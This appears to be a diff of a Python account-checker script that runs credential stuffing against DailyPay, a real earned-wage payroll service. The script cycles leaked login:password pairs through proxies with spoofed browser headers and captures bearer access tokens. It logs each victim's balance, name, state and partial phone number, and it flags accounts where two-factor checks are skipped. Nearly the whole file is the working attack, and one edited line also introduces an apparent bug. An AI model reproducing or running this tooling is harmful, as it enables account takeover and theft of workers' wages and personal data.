@@ -1,6 +1,5 @@
 import functools, tls_client, traceback, datetime, aiofiles, logging, asyncio, random, httpx, uuid, json, time, sys, \
 	ctypes, re, os
-from idlelib.iomenu import encoding
 
 from config import *
 
@@ -37,43 +36,20 @@ def update_cpm():
 		stats['requests_count'] = 0
 		stats['last_update_time'] = current_time
 
+
 def update_title():
 	text = f"Daily Pay | CPM: {stats['cpm']} | Checked: {stats['checked']} | Remaining: {stats['remaining']} | Hits: {stats['hits']} | Custom: {stats['custom']} | Fails: {stats['fails']} | Bans: {stats['bans']} | Errors: {stats['errors']}"
 	ctypes.windll.kernel32.SetConsoleTitleW(text)
 
 def update_stats(key: str, value: int, final: bool = False) -> object:
-	if final and key in 'bans:hits:custom:fails':
+	if bool and key in 'bans:hits:custom:fails':
 		stats['checked'] += 1
 		stats['remaining'] -= 1
 	if key in 'hits:custom:fails':
-		stats['requests_count'] += 1.4
+		stats['requests_count'] += 1
 	stats[key] += value
 	update_cpm()
 	update_title()
-
-def save_cookies(session, balance: float, login: str, text: str, token: str):
-	folder = 'less 500' if balance < 500 else 'more than 500'
-	save_path = f'{hits_without_2fa_path}/{folder}'
-	login = re.sub(r'[^\w\-]', '_', login)
-	filename = f'{login}.txt'
-	os.makedirs(save_path, exist_ok=True)
-	cookies_list = [
-		{
-			'name': cookie.name,
-			'value': cookie.value,
-			'domain': cookie.domain,
-			'path': cookie.path,
-			'expires': cookie.expires
-		}
-		for cookie in session.cookies
-	]
-	cookies_text = json.dumps(cookies_list)
-	file_text = f'{text}\n{token}\n{cookies_text}'
-
-	with open(f"{save_path}/{filename}", "w", encoding='utf-8') as f:
-		f.write(file_text)
-	return f"{save_path}/{filename}"
-
 
 
 
@@ -167,7 +143,7 @@ class CheckerClient:
 			elif not success: raise last_error
 
 			if 'Incorrect access, please try again' in req.text:
-				update_stats('fails', 1, True)
+				update_stats('fails', 1)
 				return False
 			elif req.status_code == 403:
 				await write_to_file(accounts_path, f'{login}:{password}\n')
@@ -176,6 +152,7 @@ class CheckerClient:
 
 
 			token = str(req.url).split('#access_token=')[1].split('&')[0]
+			# print(token)
 			headers['Authorization'] = f'Bearer {token}'
 			while True:
 				try:
@@ -184,7 +161,7 @@ class CheckerClient:
 																				  headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': user_agent}))
 					if req.status_code == 404:
 						await write_to_file(custom_path, f'{login}:{password} | new_profile = True\n')
-						update_stats('custom', 1, True)
+						update_stats('custom', 1)
 						print(f'[+] Custom: {login}:{password} | new_profile = True')
 						return False
 					# print(f'{login}:{password}', req, req.url)
@@ -205,22 +182,26 @@ class CheckerClient:
 			last_name = req_json['lastName']
 			state = req_json['stateOfResidence']
 
-
-			castle_token, user_agent = await self.get_castle_token()
-			req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://employees-api.dailypay.com/graphql', headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','content-type': 'application/json','credentials': 'include','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="126", "Not;A=Brand";v="24", "Google Chrome";v="126"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': user_agent,'x-app-bundle': 'com.DailyPay.DailyPay','x-app-version': 'undefined','x-castle-request-token': castle_token,'x-correlation-id': ''}, json={'operationName': 'testAuth','variables': {},'query': 'query testAuth {\n  employee {\n    id\n    __typename\n  }\n}\n'}))
-
+			headers['x-app-bundle'] = 'com.DailyPay.DailyPay'
+			headers['x-app-version'] = 'undefined'
+			headers['x-castle-request-token'] = castle_token
+			headers['x-correlation-id'] = ''
+			req = await self.loop.run_in_executor(None, functools.partial(session.post,
+																		  'https://employees-api.dailypay.com/graphql',
+																		  headers=headers,
+																		  json={'operationName': 'testAuth',
+																				'variables': {},
+																				'query': 'query testAuth {\n  employee {\n    id\n    __typename\n  }\n}\n'}))
+			# print(f'graphql-{login}:{password}', req, req.headers)
 			is_challenge = req.headers.get('X-Account-Challenged', True)
 			phone = req.headers.get('X-Phone-Last-Four', None)
+			if not is_challenge:
+				await write_to_file(custom_path, f'{login}:{password}:{token}\n')
+				update_stats('custom', 1)
 
 			text = f'{login}:{password} | balance = [{balance} {currency}] | firstName = {first_name} | lastName = {last_name} | state = {state.upper()} | PhoneNumber = {phone}'
-
-			if not is_challenge:
-				file_path = save_cookies(session, balance, login, text, token)
-				update_stats('custom', 1)
-				print(f'[+] Custom: {login}:{password} | 2FA skiped = True | balance = [{balance} {currency}] | Saved to {file_path}')
-
 			await write_to_file(hits_save_path, f'{text}\n')
-			update_stats('hits', 1, True)
+			update_stats('hits', 1)
 			print(f'[+] Valid: {text}')
 			return True
 		except tls_client.exceptions.TLSClientExeption:
@@ -235,15 +216,11 @@ class CheckerClient:
 			update_stats('errors', 1)
 			print('SERVER IS NOT STARTED!!!')
 			return False
-		except TypeError as e:
-			print('TypeError')
-			raise e
+		except TypeError:
 			await write_to_file(accounts_path, f'{login}:{password}\n')
 			update_stats('errors', 1)
 			return False
-		except IndexError as e:
-			print('IndexError')
-			raise e
+		except IndexError:
 			if retry:
 				await write_to_file(accounts_path, f'{login}:{password}\n')
 				update_stats('errors', 1)
@@ -255,6 +232,7 @@ class CheckerClient:
 			update_stats('errors', 1)
 			print(f'[-] Error ({type(e)}): {e}')
 			return False
+
 
 async def main():
 	proxy_client = ProxyManager(proxy_path=proxy_path)
@@ -278,8 +256,6 @@ async def main():
 	update_stats('remaining', len(accounts))
 	await asyncio.gather(*(login_task(acc) for acc in accounts))
 	await parser_client.aclient.aclose()
-
-
 
 if __name__ == '__main__':
 	try: asyncio.run(main())
